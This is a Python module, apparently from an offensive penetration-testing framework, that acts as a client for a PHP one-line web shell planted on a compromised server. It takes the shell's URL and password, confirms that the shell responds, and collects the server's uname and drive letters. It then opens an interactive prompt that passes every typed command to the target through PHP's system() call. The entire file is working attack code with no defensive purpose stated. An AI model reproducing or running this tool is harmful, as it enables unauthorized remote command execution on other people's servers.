# -*- coding: cp936 -*-
class mstpayload:
    '''php_cmdshell payload'''
    opts = [
        ['shell','PHP一句话地址'],
        ['pass','PHP一句话密码']
        ]
    codes = {
        "test":'echo "mst";',
        "uname":'echo php_uname();',
        "letter":'$l=range("A","Z");foreach($l as $d){if(is_dir($d.":")){echo $d.":\ ";}}',
        "path":'session_start();if($_SESSION["pwd"]==""){$_SESSION["pwd"]=getcwd();}echo $_SESSION["pwd"];',
        }
    def __init__(self,arr):
        self.url=arr[0]
        self.pwd=arr[1]
    def start(self):
        def res(code):
            '''get code exec res~'''
            return payloadfuck.getres(self.url,self.pwd,code)
        color.cprint("[*] Test if shell exists..",YELLOW)
        if res(self.codes['test']) == "mst":
            color.cprint("[+] Connect OK !",GREEN)
            color.cprint("[*] Uname : %s"%res(self.codes['uname']),CYAN)
            color.cprint("[*] Letter: %s"%res(self.codes['letter']),CYAN)
            path = self.codes['path']
            while 1:
                spath = res(path)
                vpath = spath
                if spath[:1] == "/":
                    if spath == "/":
                        spath = "[/]$"
                    else:
                        spath = "[%s/]$"%spath
                else:
                    spath = "%s>"%spath
                if vpath[1:3] == ":\\" and len(vpath) == 3:
                    vpath = vpath[:2]
                    spath = "%s\\>"%vpath
                cmd = raw_input(spath)
                if cmd == 'exit':
                    break
                elif len(cmd)>0:
                    if cmd[:2].upper() == "CD":
                        if len(cmd)>3:
                            if cmd[3:] == "/":
                                spath = "/"
                            else:
                                spath = spath + "/"
                            path = 'session_start();chdir("%s");if($_SESSION["pwd"]==""){$_SESSION["pwd"]=getcwd();}echo $_SESSION["pwd"];'%(spath+cmd[3:])
                    elif cmd[1:2] == ":" and len(cmd) == 2:
                        path = 'session_start();chdir("%s");if($_SESSION["pwd"]==""){$_SESSION["pwd"]=getcwd();}echo $_SESSION["pwd"];'%(cmd)
                    else:
                        code = 'chdir("%s");echo system("%s");'%(spath,cmd)
                        color.cprint(res(code),GREY)
